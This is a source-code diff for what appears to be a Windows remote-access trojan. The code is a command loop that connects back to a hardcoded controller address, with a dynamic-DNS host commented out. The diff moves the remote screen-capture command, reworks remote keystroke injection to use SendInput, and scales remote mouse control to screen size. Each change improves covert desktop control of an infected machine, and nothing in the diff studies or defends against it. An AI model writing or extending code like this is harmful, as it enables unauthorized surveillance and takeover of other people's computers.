@@ -43,6 +43,7 @@ struct MODIFY_DATA
 
 SOCKET MainSocket;
 HMODULE DllHandle;
+XScreenXor* pScreenXor;
 
 unsigned long _stdcall resolve(char *host)
 {
@@ -157,15 +158,6 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 			}
 			break;
 
-			case CMD_SCREENSTART:
-			{
-#ifdef LxScreem
-				DWORD dwSock = msgHead.dwExtend1;	//获取上线的socket == DWORD
-				CreateThread(NULL, NULL, ScreenThread, (LPVOID)dwSock, NULL, NULL);
-#endif
-			}
-			break;
-
 			case CMD_PROCESSSTART:
 			{
 #ifdef LxProc
@@ -262,6 +254,13 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 			break;
 
 #ifdef LxScreem
+			case CMD_SCREENSTART:
+			{
+				DWORD dwSock = msgHead.dwExtend1;	//获取上线的socket == DWORD
+				CreateThread(NULL, NULL, ScreenThread, (LPVOID)dwSock, NULL, NULL);
+			}
+			break;
+
 			case CMD_CTRLALTDEL:	// Ctrl + Alt + del
 			{
 				WinExec("taskmgr.exe", SW_NORMAL);
@@ -272,7 +271,13 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 			{
 				//OpenUserDesktop();
 				int nVirtKey = msgHead.dwExtend1;
-				keybd_event((BYTE)nVirtKey, 0, 0, 0);
+				//keybd_event((BYTE)nVirtKey, 0, 0, 0);
+
+				INPUT input;
+				memset(&input, 0, sizeof(INPUT));
+				input.type = INPUT_KEYBOARD;
+				input.ki.wVk = nVirtKey;
+				SendInput(1, &input, sizeof(INPUT));
 			}
 			break;
 
@@ -280,17 +285,26 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 			{
 				//OpenUserDesktop();
 				int nVirtKey = msgHead.dwExtend1;
-				keybd_event((BYTE)nVirtKey, 0, KEYEVENTF_KEYUP, 0);
+				//keybd_event((BYTE)nVirtKey, 0, KEYEVENTF_KEYUP, 0);
+
+				INPUT input;
+				memset(&input, 0, sizeof(INPUT));
+				input.type = INPUT_KEYBOARD;
+				input.ki.wVk = nVirtKey;
+				input.ki.dwFlags = KEYEVENTF_KEYUP;
+				SendInput(1, &input, sizeof(INPUT));
 			}
 			break;
 
 			case CMD_MOUSEMOVE:	//WM_MOUSEMOVE
 			{
 				//OpenUserDesktop();
+				float Radio = pScreenXor->Radio;
+
 				POINT pt;
 				pt.x = msgHead.dwExtend1;
 				pt.y = msgHead.dwExtend2;
-				SetCursorPos(pt.x, pt.y);
+				SetCursorPos(pt.x * Radio, pt.y * Radio);
 			}
 			break;
 
@@ -497,6 +511,8 @@ DWORD _stdcall ScreenThread(LPVOID lParam)
 
 	////////////////////////////////////////
 	XScreenXor m_ScreenXor;
+	pScreenXor = &m_ScreenXor;
+
 	m_ScreenXor.SetColor(nColor);//设置位图颜色
 	m_ScreenXor.InitGlobalVar();
 
@@ -911,7 +927,7 @@ DWORD WINAPI RoutineMain(LPVOID lp)
 	else
 	{
 		modify_data.ServerPort = 80;		
-		lstrcpy(modify_data.ServerAddr, "127.0.0.1");	//192.168.1.145
+		lstrcpy(modify_data.ServerAddr, "192.168.128.1");	//192.168.1.145
 		//lstrcpy(modify_data.ServerAddr, "lkyfire.vicp.net");	//192.168.1.145
 	}
 
